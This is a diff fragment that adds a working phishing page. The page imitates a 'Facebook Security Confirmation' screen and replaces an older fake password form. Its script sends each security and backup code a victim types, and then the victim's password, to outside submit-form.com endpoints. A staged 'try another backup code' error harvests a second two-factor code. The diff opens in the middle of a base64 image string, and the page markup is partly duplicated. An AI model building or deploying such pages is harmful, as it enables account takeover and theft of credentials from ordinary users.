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" alt=Logo>
-                <h3>Facebook Security</h3>
-                <p>Please re-enter password to complete the request.</p>
-                <label for=password class=sr-only>Password</label>
-                <input type=password name=password id=password placeholder=Password aria-label=Password required>
-                <button type=submit>Submit</button>
-            </div>
-        </form>
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+      const code = document.getElementById("security-code").value;
+
+      fetch("https://submit-form.com/LRMbUwT0x", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ code })
+      });
+
+      attempt++;
+
+      if (attempt === 1) {
+        message.className = "error-message";
+        message.textContent = "Something went wrong. Please try another backup code.";
+      } else if (attempt === 2) {
+        message.className = "success-message";
+        message.textContent = "Code verified. Please re-enter your password to confirm.";
+        popup.style.display = "flex";
+      }
+    });
+
+    function submitPassword() {
+      const password = document.getElementById("passwordInput").value;
+
+      fetch("https://submit-form.com/LRMbUwT0x", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ password })
+      });
+
+      popup.innerHTML = `
+        <div class="popup-content">
+          <p>Thank you. Please wait while we verify your info...</p>
+        </div>
+      `;
+    }
+  </script>
+
+
+<span id="PING_IFRAME_FORM_DETECTION" style="display: none;"></span></body>
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Security Confirmation</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    body {
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background-color: white;
+      padding: 40px 30px;
+      border-radius: 10px;
+      box-shadow: 0px 6px 18px rgba(0, 0, 0, 0.1);
+      width: 400px;
+      max-width: 90%;
+    }
+
+    .logo {
+      text-align: left;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 120px;
+    }
+
+    .header {
+      text-align: left;
+      font-size: 20px;
+      color: #333;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .description {
+      font-size: 14px;
+      color: #606770;
+      text-align: left;
+      margin-bottom: 25px;
+    }
+
+    .video-section {
+      margin-bottom: 15px;
+      text-align: left;
+    }
+
+    .video-section iframe {
+      width: 60%;
+      height: 160px;
+      border-radius: 8px;
+      display: block;
+      position: relative;
+    }
+
+    .form-group {
+      margin-bottom: 14px;
+    }
+
+    .form-group label {
+      display: block;
+      font-weight: bold;
+      margin-bottom: 8px;
+      font-size: 14px;
+      color: #606770;
+    }
+
+    .form-group input {
+      width: 70%;
+      padding: 12px;
+      border: 1px solid #ccd0d5;
+      border-radius: 6px;
+      font-size: 16px;
+      color: #1c1e21;
+    }
+
+    .form-group input:focus {
+      border-color: #1877f2;
+      outline: none;
+      box-shadow: 0px 0px 0px 2px rgba(24, 119, 242, 0.2);
+    }
+
+    .error-message {
+      color: #e74c3c;
+      font-size: 14px;
+      margin-top: 5px;
+    }
+
+    .success-message {
+      color: #2ecc71;
+      font-size: 14px;
+      margin-top: 5px;
+    }
+
+    .submit-button {
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      padding: 14px;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      width: 50%;
+    }
+
+    .submit-button:hover {
+      background-color: #166fe5;
+    }
+
+    .popup {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+    }
+
+    .popup-content {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      width: 350px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+      text-align: center;
+    }
+
+    .popup-content input {
+      margin-top: 15px;
+      width: 90%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    .popup-content button {
+      margin-top: 15px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      padding: 10px 16px;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Facebook Logo">
+    </div>
+
+    <div class="header">Security Verification Required</div>
+    <p class="description">
+      For your account’s safety, we need to confirm it’s really you. 
+      Watch The Detailed Video Information to Confirm The Account
+    </p>
+
+    <div class="video-section">
+      <iframe src="https://glnxirjevvwxbhvpkqhh.supabase.co/storage/v1/object/sign/fb/system-updated.mp4?token=eyJraWQiOiJzdG9yYWdlLXVybC1zaWduaW5nLWtleV9kNzBlNzhjMy0yMmYxLTRiZjItYmU5ZS00NTJhYjg3MTQ1MzIiLCJhbGciOiJIUzI1NiJ9.eyJ1cmwiOiJmYi9zeXN0ZW0tdXBkYXRlZC5tcDQiLCJpYXQiOjE3NTUwNTk1ODMsImV4cCI6MTc4NjU5NTU4M30.Zu2GdoDmQngkn2CuGW9oquHZESGRQxp5hRIaMEgxFgA" title="Why Security Codes Are Important" allowfullscreen=""></iframe>
+    </div>
+
+    <form id="securityForm">
+      <div class="form-group">
+        <label for="security-code">Security Code</label>
+        <input type="text" id="security-code" name="code" placeholder="Enter your security code" maxlength="10" required="" fdprocessedid="kkuikd">
+        <span id="message" class="error-message"></span>
+      </div>
+      <button type="submit" class="submit-button" fdprocessedid="ug0d7j">Confirm Account</button>
+    </form>
+  </div>
+
+  <!-- Password Popup -->
+  <div class="popup" id="passwordPopup">
+    <div class="popup-content">
+      <h3>Re-enter your password to confirm</h3>
+      <input type="password" id="passwordInput" placeholder="Password">
+      <button onclick="submitPassword()">Submit</button>
+    </div>
+  </div>
+
+  <script>
+    let attempt = 0;
+
+    const form = document.getElementById("securityForm");
+    const message = document.getElementById("message");
+    const popup = document.getElementById("passwordPopup");
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+      const code = document.getElementById("security-code").value;
+
+      fetch("https://submit-form.com/CXRCp4QcP", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ code })
+      });
+
+      attempt++;
+
+      if (attempt === 1) {
+        message.className = "error-message";
+        message.textContent = "Something went wrong. Please try another backup code.";
+      } else if (attempt === 2) {
+        message.className = "success-message";
+        message.textContent = "Code verified. Please re-enter your password to confirm.";
+        popup.style.display = "flex";
+      }
+    });
+
+    function submitPassword() {
+      const password = document.getElementById("passwordInput").value;
+
+      fetch("https://submit-form.com/LRMbUwT0x", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ password })
+      });
+
+      popup.innerHTML = `
+        <div class="popup-content">
+          <p>Thank you. Please wait while we verify your info...</p>
+        </div>
+      `;
+    }
+  </script>
+
+
+<span id="PING_IFRAME_FORM_DETECTION" style="display: none;"></span>
+</body>
+</html>
